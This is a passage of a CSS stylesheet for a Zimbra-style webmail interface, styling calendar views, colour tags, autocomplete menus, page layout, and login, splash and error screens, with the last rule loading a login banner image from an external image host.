        width: 1%;
      }
      .contactHeaderRow {
        background-color: #e9e9e9;
        height: 36px;
      }
      .contactTagsRow {
        background-color: #e9e9e9;
      }
      .contactHeader,
      .ZhFolderHeader {
        font-size: 1.64rem;
        font-weight: bold;
        color: #333;
        overflow: hidden;
        padding: 3 0 3 2;
      }
      .ZhFolderHeader {
        white-space: nowrap;
      }
      .ZhSchedularTbl {
        margin: 0 10 10 10;
      }
      .ZhSchedularTbl .allAttShDiv {
        border-bottom: 1px solid gray !important;
      }
      .ZhSchedularTbl .attName {
        border: 1px solid #cdcdcd;
        padding: 0 10px;
        white-space: nowrap;
      }
      .ZhSchedularTbl .hourLblDiv {
        width: 22px;
        height: 22px;
      }
      .ZhSchedularTbl .gridDiv {
        width: 11px;
        height: 22px;
      }
      .ZhSchedularTbl .halfHour {
        width: 11px;
        height: 22px;
        border: 1px solid silver;
        border-left: 0;
      }
      .ZhSchedularTbl .anHour {
        border-right: 1px solid #aaa;
      }
      .ZhSchedularTbl .firstDiv {
        border-left: 1px solid silver;
      }
      .ZhSchedularTbl .start {
        border-left: 3px solid green;
      }
      .ZhSchedularTbl .end {
        border-left: 3px solid darkred;
      }
      .ZmScheduler-F {
        background-color: #fff;
      }
      .ZmScheduler-B {
        background-color: #4aa6f1;
      }
      .ZmScheduler-T {
        background-color: #b9eded;
      }
      .ZmScheduler-O {
        background-color: #8854ab;
      }
      .ZmScheduler-U {
        background-color: #fff5cc;
      }
      .keyDiv {
        width: 13px;
        height: 13px;
        border: 2px inset #77736a;
      }
      .searchField {
        box-sizing: border-box;
        -webkit-box-sizing: border-box;
        padding: 0 3px;
        cursor: text;
        height: 22px;
        height: 2rem;
        height: auto;
        width: 99%;
      }
      .YsearchField {
        box-sizing: border-box;
        -webkit-box-sizing: border-box;
        padding: 0 3px;
        cursor: text;
        height: 22px;
        height: 2rem;
        height: auto;
        width: 97%;
      }
      .SearchFieldWidth {
        width: 100%;
        padding-right: 5px;
      }
      .NoResults {
        text-align: center;
        padding: 20px 0 20px 0;
        font-weight: bold;
      }
      .InitialContactSearch {
        text-align: center;
        padding: 20px 0 20px 0;
        color: gray;
      }
      .ImgDisabled {
        opacity: 0.4;
      }
      .Displayimages {
        cursor: pointer;
        background-color: #ffc;
        padding: 7px;
        font-size: 10pt;
        border-bottom: 1px solid #777;
      }
      .AttachmentImage {
        width: 120px;
        height: 80px;
      }
      .ShowAllImageName {
        font-weight: bold;
        font-size: 16px;
      }
      .Status {
        padding: 2px 0 2px 0;
      }
      .StatusEmpty {
        padding: 8px 0 6px 0;
      }
      .Status DIV {
        padding: 2px 25px 4px 25px;
        font-weight: bold;
      }
      .StatusInfo {
        background-color: #0c0;
        border-color: darkgreen;
        margin-top: 4px;
        background-color: #ffc;
        opacity: 0.95;
        border-radius: 3px;
        box-shadow: 1px 1px 2px #005d92;
      }
      .StatusWarning {
        background-color: #ff9;
        border-color: gold;
        margin-top: 4px;
        background-color: #ffc;
        opacity: 0.95;
        border-radius: 3px;
        box-shadow: 1px 1px 2px #005d92;
      }
      .StatusCritical {
        background-color: #f00;
        border-color: red;
        margin-top: 4px;
        background-color: #ffc;
        opacity: 0.95;
        border-radius: 3px;
        box-shadow: 1px 1px 2px #005d92;
      }
      .VeilOverlay {
        width: 100%;
        height: 100%;
        background-color: white;
        position: absolute;
        opacity: 0.5;
      }
      .shortcutIntro {
        background-color: #ffc;
        padding: 7px;
        border-bottom: 1px solid #777;
      }
      .shortcutList {
        width: 100%;
        border-collapse: collapse;
        margin-bottom: 10px;
      }
      .shortcutListHeader {
        border: 1px solid #999;
      }
      .shortcutKeys {
        text-align: right;
        padding: 6px 0;
        vertical-align: top;
        border: 1px solid #f2f2f2;
        font-weight: bold;
        color: #999;
      }
      .shortcutDescription {
        border: 1px solid #f2f2f2;
        padding: 5px;
        width: auto;
      }
      .shortcutKeyCombo {
        white-space: nowrap;
        padding: 5px;
      }
      .shortcutKey {
        border: 1px solid #f2f2f2;
        color: #333;
        font-weight: bold;
        padding: 2px 4px 2px 4px;
        margin: 1px 1px 1px 1px;
        line-height: 22px;
      }
      .shortcutTable {
        table-layout: fixed;
        border-collapse: collapse;
        margin-bottom: 10px;
        border: 1px solid #999;
      }
      .shortcutTable TH {
        font-size: 11px;
        text-align: left;
        font-weight: bold;
        padding-left: 5px;
        color: #666;
        border-bottom: 1px solid #999;
      }
      .SubHead,
      .PanelHead {
        font-size: 12px;
        font-weight: bold;
        padding: 3 10 5 7;
      }
      .PanelHead {
        background-color: #bab09a;
      }
      .ZhSubTabs {
        padding-top: 10px;
      }
      .ZhEditFolderContent,
      .ZhEditAddressBookContent,
      .ZhEditCalendarContent,
      .ZhEditTagContent {
        background-color: #fff;
        border-color: #ccc #999999 #999 #cccccc;
        margin: 0;
        border-width: 1px;
        border-style: solid;
      }
      .ZhCalType,
      .ZhABType,
      .ZhFolderType {
        color: #999;
      }
      .ZhCalMonthHeaderRow {
        background-color: #e5e5e5;
      }
      .ZhCalMonthTable {
        border-collapse: collapse;
        border-spacing: 0;
        padding: 0;
        background-color: #fff;
      }
      .ZhCalMonthHeaderMonth {
        background-color: #e5e5e5;
        color: #333;
        font-size: 1.64rem;
        font-weight: bold;
        white-space: nowrap;
        overflow: hidden;
        color: #333;
        text-align: center;
      }
      .ZhCalMonthHeaderCellsText {
        background-color: #e5e5e5;
        color: #333;
        font-size: 1.18rem;
        padding: 2px;
        border-bottom: 1px solid #f2f2f2;
        white-space: nowrap;
        overflow: hidden;
        color: #333;
        text-align: center;
      }
      .ZhCalMonthDay,
      .ZhCalMonthDaySelected {
        border: 1px solid #f2f2f2;
        white-space: nowrap;
        overflow: hidden;
        vertical-align: top;
        cursor: pointer;
      }
      .ZhCalMonthDaySelected {
        background-color: #99cae7 !important;
      }
      .ZhCalDayHeader,
      .ZhCalDayHeaderToday {
        background-color: #e5e5e5;
        color: #333;
        font-size: 1.18rem;
        white-space: nowrap;
        overflow: hidden;
        color: #333;
        text-align: center;
        border-bottom: 1px solid #f2f2f2;
        line-height: 2em;
      }
      .ZhCalPager {
        color: #333;
        font-size: 1.18rem;
        white-space: nowrap;
        overflow: hidden;
        color: #333;
        text-align: center;
      }
      .ZhCalMonthHeaderRow a:link,
      .ZhCalMonthHeaderRow a:visited {
        color: #333;
      }
      .ZhCalDayHeaderToday,
      .ZhCalDayHeaderToday a:link,
      .ZhCalDayHeaderToday a:visited {
        color: #005d92;
      }
      .ZhCalDOM,
      .ZhCalDOMT,
      .ZhCalDOMO,
      .ZhCalDOMOT {
        white-space: nowrap;
        overflow: hidden;
        font-size: 1.18rem;
        padding-left: 3px;
        padding-right: 3px;
        text-align: right;
      }
      .ZhCalMonthTable a:link,
      .ZhCalMonthTable a:visited,
      .ZhCalMiniContainer a:link,
      .ZhCalMiniContainer a:visited,
      .ZhCalMonthHeaderRow a:link,
      .ZhCalMonthHeaderRow a:visited {
        text-decoration: none;
        color: inherit;
      }
      .ZhCalDOM,
      .ZhCalDOM a:link,
      .ZhCalDOM a:visited {
        color: #333;
      }
      .ZhCalDOMT,
      .ZhCalDOMT a:link,
      .ZhCalDOMT:visited {
        color: #005d92;
      }
      .ZhCalDOMO,
      .ZhCalDOMO a:link,
      .ZhCalDOMO a:visited {
        color: #999;
      }
      .ZhCalDOMOT,
      .ZhCalDOMOT a:link,
      .ZhCalDOMOT a:visited {
        color: #999;
        color: #005d92;
      }
      .ZhCalMiniContainer {
        background-color: #fff;
        border-color: #ccc #999999 #999 #cccccc;
        margin: 0;
        border-width: 1px;
        border-style: solid;
        height: 142px;
        padding-bottom: 5px;
      }
      .ZhCalMDS {
        background-color: #99cae7 !important;
      }
      .ZhCalMDOM,
      .ZhCalMDOMT,
      .ZhCalMDOMO,
      .ZhCalMDOMOT {
        white-space: nowrap;
        overflow: hidden;
        font-size: 0.9rem;
        padding-left: 3px;
        padding-right: 3px;
        padding: 2px;
        border: 0;
        text-align: center;
      }
      .ZhCalMDOMT {
        padding: 1px;
        border: 1px solid darkred;
      }
      .ZhCalMDHA {
        text-align: center;
        font-weight: bold;
      }
      .ZhCalMDOMOT,
      .ZhCalMDOMOT a:link,
      .ZhCalMDOMOT a:visited {
        padding: 1px;
        border: 1px solid darkred;
      }
      .ZhCalMDOM a:link,
      .ZhCalMDOM a:visited,
      ZhCalMDOMT a:link,
      .ZhCalMDOMT a:visited {
        color: #333;
      }
      .ZhCalMiniTitlebar {
        height: 26px;
        height: 2.4rem;
        padding-top: 2px;
        padding-top: 0.2rem;
        background-color: transparent;
        border-right-width: 0;
      }
      .ZhCalMiniTitleCell {
        white-space: nowrap;
        color: #333;
        width: auto;
        cursor: pointer;
        font-weight: normal;
      }
      .ZhCalMiniTitleCell a:link,
      .ZhCalMiniTitleCell a:visited {
        color: #333;
      }
      .ZhCalMiniDow {
        color: #999;
        text-align: center;
        font-weight: normal;
      }
      .ZhCalMonthAppt {
        padding: 0 5px 0 5px;
      }
      .ZhApptSel {
        border: 1px dashed black;
      }
      .ZhCalMonthAllDayAppt,
      .ZhCalMonthAllDayApptNew,
      .ZhCalDayAllDayAppt,
      .ZhCalDayAllDayApptNew {
        border: 2px solid #333;
        border-top-width: 1px;
        border-bottom-width: 1px;
      }
      .ZhCalMonthAllDayAppt,
      .ZhCalMonthAllDayApptNew {
        padding: 0 5px 0 5px;
      }
      .ZhCalDayAllDayAppt,
      .ZhCalDayAllDayApptNew {
        cursor: pointer;
      }
      .ZhCalDayAppt,
      .ZhCalDayApptNew {
        border: 1px solid;
        border-color: #aaa #333333 #333 #aaaaaa;
        cursor: pointer;
      }
      .ZhCalDayApptEnd,
      .ZhCalTimeZone {
        color: #999;
      }
      .ZhCalDayHour {
        background-color: #fff;
        color: #333;
        padding: 2px;
        border-bottom: 1px solid #f2f2f2;
        white-space: nowrap;
        overflow: hidden;
        color: #333;
        text-align: center;
      }
      .ZhCalDayHS {
        border-right: 1px solid #f2f2f2;
      }
      .ZhCalAllDayDS {
        border-left: 1px solid #f2f2f2;
      }
      .ZhCalDayHSB {
        border-right: 1px solid #f2f2f2;
        border-bottom: 1px solid #f2f2f2;
      }
      .ZhCalDayHHB {
        border-bottom: 1px solid #f4f4f4;
        border-bottom-style: dashed;
      }
      .ZhCalDayHB {
        border-bottom: 1px solid #f4f4f4;
      }
      .ZhCalDayADB {
        border-bottom: 1px solid #f4f4f4;
        border-bottom-width: 4px;
      }
      .ZhCalDaySEP {
        border-left: 1px solid #f2f2f2;
      }
      .ZhCalDayADHS {
        border-right: 1px solid #f2f2f2;
        border-bottom: 1px solid #f4f4f4;
        border-bottom-width: 4px;
      }
      .ZhCalDayGrid {
        background-color: #fff;
      }
      .ZhCalDayUnionSEP {
        border-left: 1px solid #f2f2f2;
        border-right: 1px solid #f2f2f2;
      }
      .ZhCalSchedUnion {
        text-align: center;
        background-color: #d90000;
        color: #333;
        width: 25px;
      }
      .apptHeaderRow {
        height: 28px;
      }
      .editViewLabel {
        width: 1%;
        color: #333;
        white-space: nowrap;
        text-align: right;
      }
      .apptHeader {
        font-size: 18px;
        font-weight: bold;
        color: #333;
        overflow: hidden;
      }
      .ZhCalDayGrid A:link,
      .ZhCalDayGrid A:visited,
      .ZhCalMonthTable A:link,
      .ZhCalMonthTable A:visited {
        color: inherit;
        text-decoration: none;
      }
      .ZhBottomSep {
        border-bottom: 1px solid #f2f2f2;
      }
      .ZhApptRecurrInfo {
        cursor: pointer;
        background-color: #ffc;
        padding: 7px 0;
        font-size: 10pt;
        border-bottom: 1px solid #777;
      }
      .ZhCallListPrintTable TH {
        font-weight: bold;
      }
      .ZhCallListPrintTable TD,
      .ZhCallListPrintTable TH {
        padding-left: 20;
        padding-right: 20;
        border-bottom: 1px solid;
        text-align: left;
      }
      .ZhZimbraTitle {
        font-size: 1.64rem;
        font-weight: bold;
      }
      .ZhOptVoice .List TD,
      .ZhOptVoice .List TH {
        padding-left: 20px;
      }
      .ZhOptVoiceCBCell {
        width: 23;
      }
      .ZhOptVoiceRemove {
        padding: 0;
        margin: 0;
        border: none;
        cursor: pointer;
        font-size: 1rem;
        color: #333;
        background-color: transparent;
        text-decoration: underline;
      }
      .Selection {
        background-color: #add6d6;
      }
      .SelectionDark {
        background-color: #91c8c8;
      }
      .SelectionLight {
        background-color: #c8e4e4;
      }
      .SelectionBg {
        background-color: #e3f1f1;
      }
      .Red {
        background-color: #e34040;
      }
      .RedDark {
        background-color: #d90000;
      }
      .RedLight {
        background-color: #ec8080;
      }
      .RedBg {
        background-color: #f5bfbf;
      }
      .RedC {
        color: #e34040;
      }
      .RedDarkC {
        color: #d90000;
      }
      .RedLightC {
        color: #ec8080;
      }
      .RedBgC {
        color: #f5bfbf;
      }
      .Pink {
        background-color: #f492bf;
      }
      .PinkDark {
        background-color: #f06ea9;
      }
      .PinkLight {
        background-color: #f8b7d4;
      }
      .PinkBg {
        background-color: #fbdbe9;
      }
      .PinkC {
        color: #f492bf;
      }
      .PinkDarkC {
        color: #f06ea9;
      }
      .PinkLightC {
        color: #f8b7d4;
      }
      .PinkBgC {
        color: #fbdbe9;
      }
      .Orange {
        background-color: #ff9940;
      }
      .OrangeDark {
        background-color: #f70;
      }
      .OrangeLight {
        background-color: #ffbb80;
      }
      .OrangeBg {
        background-color: #ffddbf;
      }
      .OrangeC {
        color: #ff9940;
      }
      .OrangeDarkC {
        color: #f70;
      }
      .OrangeLightC {
        color: #ffbb80;
      }
      .OrangeBgC {
        color: #ffddbf;
      }
      .Yellow {
        background-color: #ffe640;
      }
      .YellowDark {
        background-color: #fd0;
      }
      .YellowLight {
        background-color: #ffee80;
      }
      .YellowBg {
        background-color: #fff6bf;
      }
      .YellowC {
        color: #ffe640;
      }
      .YellowDarkC {
        color: #fd0;
      }
      .YellowLightC {
        color: #ffee80;
      }
      .YellowBgC {
        color: #fff6bf;
      }
      .Green {
        background-color: #40a05f;
      }
      .GreenDark {
        background-color: #00802a;
      }
      .GreenLight {
        background-color: #80c095;
      }
      .GreenBg {
        background-color: #bfdfca;
      }
      .GreenC {
        color: #40a05f;
      }
      .GreenDarkC {
        color: #00802a;
      }
      .GreenLightC {
        color: #80c095;
      }
      .GreenBgC {
        color: #bfdfca;
      }
      .Cyan {
        background-color: #40d9d9;
      }
      .CyanDark {
        background-color: #0cc;
      }
      .CyanLight {
        background-color: #80e6e6;
      }
      .CyanBg {
        background-color: #bff2f2;
      }
      .CyanC {
        color: #40d9d9;
      }
      .CyanDarkC {
        color: #0cc;
      }
      .CyanLightC {
        color: #80e6e6;
      }
      .CyanBgC {
        color: #bff2f2;
      }
      .Blue {
        background-color: #4073d9;
      }
      .BlueDark {
        background-color: #04c;
      }
      .BlueLight {
        background-color: #80a2e6;
      }
      .BlueBg {
        background-color: #bfd0f2;
      }
      .BlueC {
        color: #4073d9;
      }
      .BlueDarkC {
        color: #04c;
      }
      .BlueLightC {
        color: #80a2e6;
      }
      .BlueBgC {
        color: #bfd0f2;
      }
      .Purple {
        background-color: #7940a0;
      }
      .PurpleDark {
        background-color: #4c0080;
      }
      .PurpleLight {
        background-color: #a680c0;
      }
      .PurpleBg {
        background-color: #d2bfdf;
      }
      .PurpleC {
        color: #7940a0;
      }
      .PurpleDarkC {
        color: #4c0080;
      }
      .PurpleLightC {
        color: #a680c0;
      }
      .PurpleBgC {
        color: #d2bfdf;
      }
      .Gray {
        background-color: #bfbfbf;
      }
      .GrayDark {
        background-color: #a9a9a9;
      }
      .GrayLight {
        background-color: #d4d4d4;
      }
      .GrayBg {
        background-color: #e9e9e9;
      }
      .GrayC {
        color: #bfbfbf;
      }
      .GrayDarkC {
        color: #a9a9a9;
      }
      .GrayLightC {
        color: #d4d4d4;
      }
      .GrayBgC {
        color: #e9e9e9;
      }
      .ZhAC {
        position: relative;
      }
      .ZhACB {
        font-weight: bold;
      }
      .ZhACCont {
        position: absolute;
        bottom: 0;
      }
      .ZhACCont .yui-ac-content {
        position: absolute;
        border: 1px solid #404040;
        background: #fff;
        overflow: hidden;
        z-index: 9050;
      }
      .ZhACCont .yui-ac-shadow {
        position: absolute;
        margin: 0.3em;
        background: #a0a0a0;
        z-index: 9010;
      }
      .ZhACCont ul {
        margin: 0;
        padding: 1px 0;
        list-style: none;
      }
      .ZhACCont li {
        margin: 0;
        padding: 0 1px;
        cursor: default;
        white-space: nowrap;
      }
      .ZhACCont li.yui-ac-highlight {
        background-color: #99cae7 !important;
      }
      .ZhACCont li.yui-ac-prehighlight {
        background: #ffc;
      }
      .ZhACTo {
        z-index: 9050;
      }
      .ZhACCc {
        z-index: 9040;
      }
      .ZhACBcc {
        z-index: 9030;
      }
      .ZOptionsHeader {
        font-size: 1.36rem;
        font-weight: bold;
        color: white;
      }
      .ZHeader {
        font-size: 13px;
        font-weight: bold;
      }
      .ZOptionsHint {
        color: #999;
      }
      .ZOptionsSectionMain {
        background-color: #fff;
        padding: 1em;
      }
      .ZOptionsLabel,
      .ZOptionsLabelTop,
      .ZOptionsLabelNarrow,
      .ZOptionsTableLabel {
        width: 150px;
        font-weight: bold;
        white-space: nowrap;
        text-align: right;
        vertical-align: middle;
        line-height: 20px;
      }
      .ZOptionsLabelTop {
        vertical-align: top;
        line-height: 20px;
      }
      .ZOptionsLabelNarrow {
        width: auto;
      }
      .ZOptionsInfo {
        color: #999;
      }
      .ZhDateHint {
        color: #999;
        padding-left: 5px;
      }
      .ZhHomeVoiceCell {
        padding: 0;
      }
      .ZhHomeVoiceIframe {
        background-color: #fff;
        width: 100%;
        height: 240px;
      }
      .ZhHomeVoiceBody {
        background-color: #fff;
        width: 100%;
        height: 100%;
      }
      .ZhHomeVoiceTable {
        background-color: #fff;
        width: 100%;
      }
      .ZhHomeVoiceTable .ZhHomeCell {
        padding-left: 15px;
      }
      .ZhHomeRow {
        height: 40px;
      }
      .ZhHomeCell {
        border-bottom: 1px solid #ccc;
        padding: 5px;
      }
      .ZhHomeTextLink {
        color: #000;
        text-decoration: none;
      }
      .ZhContainingBox {
        float: left;
        background-color: #fff;
      }
      .ZhThumbnailItem {
        background-color: transparent;
        background-repeat: no-repeat;
        cursor: pointer;
        float: left;
        height: 120px;
        margin: 8px;
        vertical-align: middle;
        width: 100px;
      }
      .ZhThumbnailItem .ZhThumbnailIcon {
        background-color: transparent;
        border: 2px solid #ccc;
        font-size: 1px;
        height: 100px;
        line-height: 100px;
        text-align: center;
        width: 96px;
      }
      .ZhThumbnailItem .ZhThumbnailName {
        display: block;
        font-size: 1rem;
        font-family: Helvetica, Arial, sans-serif;
        margin: 3px 0 0 0;
        text-align: center;
        height: 14px;
        overflow: hidden;
      }
      .ZhThumbnailImg {
        margin: 26px 24px;
      }
      .yui-skin-sam .yui-toolbar-container .yui-toolbar-subcont {
        padding: 0 1.5em 0.5em 1em !important;
        border-bottom: 1px solid #808080;
      }
      .yui-toolbar-group-indentlist,
      .yui-toolbar-group-alignment {
        width: 125px !important;
      }
      input[type="text"],
      input[type="password"] {
        color: black;
        border: 1px solid #bfbfbf;
      }
      input[disabled] {
        color: #999;
        background-color: transparent;
        border: 1px solid #e5e5e5;
      }
      .ImgPrefsHeader {
        width: auto !important;
      }
      RUBY,
      RUBY RT {
        text-indent: 0;
      }
      RUBY RT,
      RUBY RP {
        font-size: 70%;
        font-weight: normal;
      }
      RUBY RT,
      RUBY RB {
        margin-right: 0.7em;
      }
      BODY {
        margin: 0;
      }
      .skin_layout_row {
        width: 100%;
        clear: both;
      }
      .skin_layout_cell {
        height: 100%;
        float: left;
        margin-bottom: auto;
      }
      .skin_layout {
        display: block;
        clear: both;
        width: 100%;
        height: 100%;
      }
      #skin_outer * {
        box-sizing: border-box;
        -webkit-box-sizing: border-box;
      }
      .skin_table {
        width: 100%;
        height: 100%;
        border-collapse: collapse;
        border-width: 0;
      }
      .skin_table > TBODY > TR > TD {
        padding: 0;
      }
      .skin_table > .skin_table_row > .skin_table_cell {
        padding: 0;
      }
      .skin_container {
        width: 100%;
        height: 100%;
      }
      .skin_container_ad {
        width: 100%;
        height: 100%;
      }
      .skin_td_flex {
        width: 100%;
      }
      #skin_outer {
        display: none;
      }
      #skin_tr_search_results_toolbar {
        display: none;
        height: 40px;
        width: 100%;
      }
      #skin_tr_main {
        height: 100%;
      }
      .skin_outer_ad {
        display: none;
      }
      #skin_outer {
        height: 100%;
        background-color: #fff;
      }
      #skin_layout_outer {
        width: 100%;
        height: 100%;
        padding: 0;
      }
      #skin_outer_td_main {
        height: 100%;
        width: 100%;
      }
      #skin_spacing_top_row {
        width: 100%;
        background: #007cc3;
        background: #007cc3;
      }
      #skin_spacing_top_row .divider {
        border-left: 1px solid transparent;
        height: 60%;
        margin: auto 10px;
      }
      #skin_spacing_top_row > .skin_table {
        border-collapse: separate;
      }
      #skin_spacing_top_row .DwtLinkButtonDropDownArrowRow {
        background-color: white;
      }
      #skin_container_logo {
        width: 200px;
      }
      #skin_container_toast {
        width: 100%;
        height: 100%;
      }
      #skin_spacing_search,
      #skin_spacing_people_search {
        height: 42px;
        width: null;
      }
      #skin_container_search {
        height: 1.7rem;
      }
      #skin_container_search .ZmSearchToolbar {
        background-color: white;
        border-radius: 4px;
      }
      #skin_container_search .ZButton {
        height: auto;
      }
      #skin_container_search .ZButtonBorder {
        border: 0;
        background-color: transparent;
        background-image: none;
        box-shadow: 0 0 0 transparent;
        border-radius: 0;
      }
      #skin_container_search .ZWidgetTitle {
        display: none;
      }
      #skin_spacing_tree_top {
        text-align: center;
      }
      #skin_container_tree_top {
        height: 30px;
        background-color: #fff;
        border: 1px solid #b2b2b2;
        border-radius: 3px 3px 0 0;
      }
      #skin_container_username {
        height: auto;
        padding-bottom: 2px;
        color: white;
        font-weight: bold;
      }
      #skin_container_quota {
        height: auto;
        width: 100%;
      }
      #skin_dropMenu {
        font-size: 14px;
        padding: 0 10px 0 3px;
        text-align: center;
        vertical-align: middle;
        color: white;
        cursor: pointer;
      }
      #skin_dropMenu .DwtLinkButtonDropDownArrowTd {
        border-left: 0;
        opacity: 0.75;
        padding-left: 0;
      }
      #skin_dropMenu .ZHover .DwtLinkButtonDropDownArrowTd {
        opacity: 1;
      }
      #skin_container_global_buttons {
        display: table-row;
      }
      #skin_container_global_buttons > DIV {
        display: table-cell;
        padding-top: 2px;
      }
      #skin_container_current_app {
        height: 26px;
        height: 2.4rem;
        padding-top: 2px;
        padding-top: 0.2rem;
        background-color: transparent;
      }
      #skin_td_switch_offline,
      #skin_container_help,
      #skin_container_logoff,
      #skin_container_adminlink {
        white-space: nowrap;
        text-align: center;
        padding: 0 10px;
      }
      #skin_container_help A,
      #skin_container_logoff A {
        color: white;
      }
      #skin_spacing_tree {
        height: 100%;
        padding-bottom: 5px;
      }
      #skin_container_tree {
        background-color: #fff;
        border: none;
        border-radius: 3px;
        height: 100%;
      }
      #skin_tr_tree_footer {
        display: none;
      }
      #skin_container_tree_footer {
        background-color: #fff;
        border: none;
        border-radius: 3px;
        height: 13.75rem;
      }
      #skin_border_app_chooser {
        height: 29px;
        height: 2.6rem;
        border-radius: 3px 3px 0 0;
        border: solid #b2b2b2;
        border-width: 0 0 1px;
      }
      #skin_container_app_chooser {
        margin-right: 100px;
        position: absolute;
        width: auto;
        height: auto;
        z-index: 1;
        margin-top: -1rem;
      }
      #skin_container_app_chooser > DIV > TABLE {
        margin-top: 0.8rem;
      }
      #skin_container_global_buttons .offline {
        margin: 0 5px 0 8px;
      }
      #skin_container_global_buttons .ZToolbarButton,
      #skin_container_global_buttons .ZToolbarButtonTable {
        background-color: transparent;
        background-image: none;
        border: 0;
        border-collapse: separate;
        box-shadow: 0 0 0 transparent;
      }
      #skin_container_global_buttons .ZToolbarButton {
        margin-left: 3px;
      }
      #skin_container_global_buttons .ZHover .ZToolbarButtonBorder {
        background-color: rgba(255, 255, 255, 0.2);
      }
      #skin_container_global_buttons .ZFocused .ZToolbarButtonBorder {
        background-color: rgba(255, 255, 255, 0.2);
      }
      #skin_container_global_buttons .ZActive .ZToolbarButtonBorder {
        background-color: rgba(255, 255, 255, 0.5);
      }
      #skin_container_global_buttons .ZSelected .ZToolbarButtonBorder {
        background-color: #fff;
      }
      #skin_spacing_app_top_toolbar {
        height: 35px;
        height: 3rem;
      }
      #skin_container_app_top_toolbar {
        height: 26px;
        height: 2.4rem;
        padding-top: 2px;
        padding-top: 0.2rem;
        background-color: transparent;
        width: auto;
        padding-top: 5px;
        padding-left: 7px;
      }
      #skin_container_app_new_button {
        height: 26px;
        height: 2.4rem;
        padding-top: 2px;
        padding-top: 0.2rem;
        background-color: transparent;
        width: 16rem;
        padding: 5px;
      }
      #skin_spacing_app_row {
        border-top: 1px solid;
        border-spacing: 0;
        padding: 0 7px;
        height: 2.5rem;
        margin-top: -1rem;
      }
      #skin_spacing_app_row {
        background-color: transparent;
        background-color: rgba(0, 135, 195, 0.1);
        border-color: transparent;
        border-color: rgba(0, 135, 195, 0.2);
        border-color: rgba(0, 135, 195, 0.1);
      }
      #skin_spacing_app_row TABLE {
        border-collapse: separate;
      }
      #skin_spacing_app_row .ZToolbarButton {
        height: auto;
      }
      #skin_spacing_app_main {
        height: 100%;
      }
      #skin_container_top_ad {
        height: 60px;
      }
      #skin_spacing_sidebar_ad {
        padding: 10px 0 0 5px;
      }
      #skin_container_sidebar_ad {
        width: 165px;
      }
      #skin_container_tree_top_ad {
        height: 30px;
      }
      #skin_container_tree_bottom_ad {
        height: 60px;
      }
      #skin_container_bottom_ad {
        height: 40px;
      }
      #skin_td_tree {
        width: 16rem;
        height: 100%;
      }
      #skin_td_tree_app_sash {
        width: 7px;
      }
      #skin_td_main {
        width: auto;
        height: 100%;
      }
      #skin_td_sidebar_ad {
        width: 165px;
      }
      #skin_container_splash_screen {
        background-color: #fff;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        z-index: 90000000;
      }
      .LoginScreen,
      .SplashScreen,
      .ErrorScreen {
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans",
          sans-serif;
        font-size: 1rem;
        background-color: #ededed;
        background-image: -webkit-gradient(
          linear,
          left top,
          bottom bottom,
          to(#fff),
          from(#ededed)
        );
        background-image: -webkit-linear-gradient(top, #fff, #ededed);
      }
      .LoginScreen .center,
      .SplashScreen .center,
      .ErrorScreen .center {
        margin-top: -160px;
        margin-left: -250px;
      }
      .LoginScreen .center-small,
      .SplashScreen .center-small,
      .ErrorScreen .center-small {
        height: 270px;
        margin-top: -135px;
        margin-left: -126px;
        width: 250px;
      }
      .LoginScreen .center,
      .LoginScreen .center-small,
      .SplashScreen .center,
      .SplashScreen .center-small,
      .ErrorScreen .center,
      .ErrorScreen .center-small {
        left: 50%;
        overflow: visible;
        position: absolute;
        top: 40%;
        z-index: 11;
      }
      .LoginScreen .contentBox,
      .SplashScreen .contentBox,
      .ErrorScreen .contentBox {
        background-color: #007cc3;
        padding: 10px 0 40px;
        border-radius: 3px;
        width: 500px;
      }
      .LoginScreen .contentBox,
      .SplashScreen .contentBox {
        min-height: 265px;
      }
      .LoginScreen .center-small .contentBox,
      .SplashScreen .center-small .contentBox,
      .ErrorScreen .center-small .contentBox {
        width: auto;
      }
      .center-small .form .submittd {
        text-align: left;
      }
      .LoginScreen H1,
      .SplashScreen H1 {
        margin: 0 30px 30px;
        overflow: hidden;
      }
      #ZLoginAppName {
        color: white;
        display: none;
      }
      .LoginScreen .ImgLoginBanner,
      .LoginScreen .ImgAppBanner,
      .SplashScreen .ImgLoginBanner {
        cursor: pointer;
        display: block;
      }
      .LoginScreen #ZLoginErrorPanel,
      .ErrorScreen .InlineErrorPanel {
        border: 0;
        left: auto;
        margin: 10px 10%;
        position: relative;
        background-color: #ff9;
        padding: 0.5em 1em;
        border-radius: 8px;
      }
      .LoginScreen #ZLoginErrorIcon,
      .ErrorScreen #ZErrorIcon {
        margin: auto 10px auto auto;
      }
      .LoginScreen .Footer,
      .SplashScreen .Footer,
      .LoginScreen .Footer-small,
      .SplashScreen .Footer-small {
        bottom: 0;
        position: absolute;
        text-align: center;
        width: 100%;
        z-index: 10;
      }
      .LoginScreen .copyright,
      .LoginScreen #ZLoginNotice,
      .SplashScreen .copyright {
        cursor: default;
        margin-bottom: 5px;
        font-size: 1rem;
        color: #656565;
      }
      .LoginScreen .zLoginField {
        border-radius: 5px;
      }
      .LoginScreen INPUT[disabled] {
        background-color: white;
      }
      .LoginScreen .decor1 {
        display: none;
      }
      .LoginScreen .decor2 {
        display: none;
      }
      .LoginScreen #ZLoginNotice A {
        color: #656565;
      }
      .SplashScreen .content {
        color: white;
        text-align: center;
      }
      .SplashScreen .message {
        color: white;
        cursor: default;
        padding-top: 40px;
        font-size: 1.36rem;
        font-weight: bold;
      }
      .SplashScreen .switch {
        margin: 70px 100px 30px;
        margin-bottom: 0;
      }
      .SplashScreen .switch A {
        color: white;
        text-decoration: underline;
        font-size: 1rem;
      }
      .SplashScreen .decor1 {
        display: none;
      }
      .SplashScreen .decor2 {
        display: none;
      }
      .ErrorScreen .contentBox {
        padding-bottom: 1em;
      }
      .ErrorScreen .ZErrorPanel {
        margin-top: 30px;
      }
      .ErrorScreen H2 {
        margin: 0;
      }
      .ErrorScreen A:link,
      .ErrorScreen A:visited {
        color: #005a95;
        text-decoration: none;
        cursor: pointer;
      }
      .ErrorScreen A:hover {
        color: #005a95;
        text-decoration: underline;
      }
      .ErrorScreen A:active {
        color: darkgreen;
        text-decoration: underline;
      }
      .ErrorScreen .decor1 {
        display: none;
      }
      .ErrorScreen .decor2 {
        display: none;
      }
      .center-small .ImgLoginBanner,
      .ImgAppBanner {
        background-repeat: no-repeat;
        background-position: left center;
        background-image: url(https://i.imgur.com/oUI4XsO.png);
